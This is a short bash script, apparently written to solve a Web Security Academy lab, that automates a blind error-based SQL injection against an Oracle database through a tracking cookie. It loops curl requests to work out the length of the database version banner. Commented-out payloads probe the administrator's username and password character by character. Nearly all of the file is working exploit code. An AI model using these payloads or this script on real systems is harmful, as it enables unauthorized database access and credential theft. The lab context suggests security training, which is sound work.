#!/bin/bash



tkid=lrb4gssjHHSYEa7m
session=gTwVTdFdupV5NckoJxM1lHysfrXKwO6Y
url=https://0a3b006a032bd08e813744ce00550038.web-security-academy.net/



for i in {1..80}; do
	payload="' and (select case when length((select banner from v\$version where banner like 'Oracle%25')) = $i then to_char(1/0) else 'a' end from users where username='administrator') = 'a'--"
			 
	if curl -s -b "TrackingId=$tkid$payload;session=$session" $url | grep -q -i 'internal server error' ; then
		echo "$i is the correct "
		break
	else
		echo "$i is not the correct "
	fi
done



#correct="' and (select case when substr(username,1,1) = 'c' then to_char(1/0) else 'a' end from users where username='administrator') = 'a'--"
#correct="' and (select case when substr((select listagg(version) within group (order by version) from product_component_version),1,1) = 'c' then to_char(1/0) else 'a' end from users where username='administrator') = 'a'--"

#wronggg="' and (select case when substr(password, 1, 1) ='a' then to_char(1/0) else 'a' end from users where username='administrator') = 'a'--"
